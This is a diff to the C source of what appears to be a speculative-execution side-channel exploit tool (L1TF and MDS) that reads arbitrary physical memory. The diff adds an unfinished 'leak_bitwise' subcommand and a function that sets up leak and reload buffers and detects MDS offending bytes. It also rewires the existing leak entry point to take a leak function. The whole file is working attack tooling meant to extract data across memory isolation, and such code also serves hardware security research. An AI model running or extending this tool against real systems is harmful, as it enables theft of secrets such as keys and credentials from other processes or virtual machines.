@@ -369,6 +369,36 @@ void *l1tf_scan_physical_memory(scan_opts_t scan_opts, size_t needle_size, char 
   return NULL;
 }
 
+void do_leak_bitwise(const uintptr_t phys_addr, const size_t length) {
+  initialize_pteditor_lib();
+
+  fprintf(stderr, "Attempting to leak %ld bytes from %p...\n", length, (void *)phys_addr);
+  fprintf(stderr, "Request leak and reload buffers\n");
+
+  bit_reload_buffer *reload_buffer = mmap(NULL, 2 * sizeof(bit_reload_buffer), PROT_WRITE | PROT_READ,
+                                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+
+  leak_addr_t leak = l1tf_leak_buffer_create();
+  l1tf_leak_buffer_modify(&leak, (void *)phys_addr);
+
+  fprintf(stderr, "Clear the reload buffer at %p\n", reload_buffer);
+  memset(reload_buffer, 0, sizeof(reload_buffer_t));
+
+  const size_t results_size = length * sizeof(uint8_t);
+  uint8_t *results = malloc(results_size);
+  memset(results, 0, results_size);
+
+  fprintf(stderr, "Detecting MDS offenders...\n");
+  mds_offenders_t mds_offenders = detect_mds_bytes_in_page();
+  printf("-> Amount of offending bytes: %ld\n", mds_offenders.amount);
+
+  printf("Continously leaking %ld bytes from physcial address 0x%lx:\n", length, phys_addr);
+  size_t start = (phys_addr & 0xfff);
+  assert(start + length < 0xfff);
+  //
+  // printf("hellO!");
+}
+
 void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]) {
   initialize_pteditor_lib();
   full_reload_buffer_t reload_buffer = {0};
@@ -387,7 +417,7 @@ void do_scan(scan_opts_t scan_opts, size_t needle_size, char needle[needle_size]
 }
 
 // If you already know a physical address that you want to leak
-int main_leak(const int argc, char *argv[argc]) {
+int main_leak(const int argc, char *argv[argc], void (*leak_func)(uintptr_t, size_t)) {
   // Parse the physcial address and the length from the
   // command line arguments
   uintptr_t phys_addr = -1;
@@ -427,15 +457,15 @@ int main_leak(const int argc, char *argv[argc]) {
   // Make sure that both the phys_addr and length are set
   if (phys_addr == (uintptr_t)-1 || length == (size_t)-1) {
     fprintf(stderr,
-            "Required arguments of leak subcommand\n"
+            "Required arguments of %s subcommand\n"
             "\t-%c, --%s\thexadecimal physical address where you "
             "want to leak from\n"
             "\t-%c, --%s\tamount of bytes you want to leak\n",
-            options[0].val, options[0].name, options[1].val, options[1].name);
+            argv[1], options[0].val, options[0].name, options[1].val, options[1].name);
     exit(1);
   }
 
-  do_leak(phys_addr, length);
+  leak_func(phys_addr, length);
   exit(0);
 }
 
@@ -522,16 +552,20 @@ int main(int argc, char *argv[argc]) {
 
   if (argc >= 2) {
     if (!strcmp("leak", argv[1])) {
-      return main_leak(argc, argv);
+      return main_leak(argc, argv, do_leak);
+    } else if (!strcmp("leak_bitwise", argv[1])) {
+      return main_leak(argc, argv, do_leak_bitwise);
     } else if (!strcmp("scan", argv[1])) {
       return main_scan(argc, argv);
     }
   }
 
+  char *name = argv[0];
   fprintf(stderr,
           "Usage\n"
           "\t%s leak\n"
+          "\t%s leak_bitwise\n"
           "\t%s scan\n",
-          argv[0], argv[0]);
+          name, name, name);
   exit(1);
 }
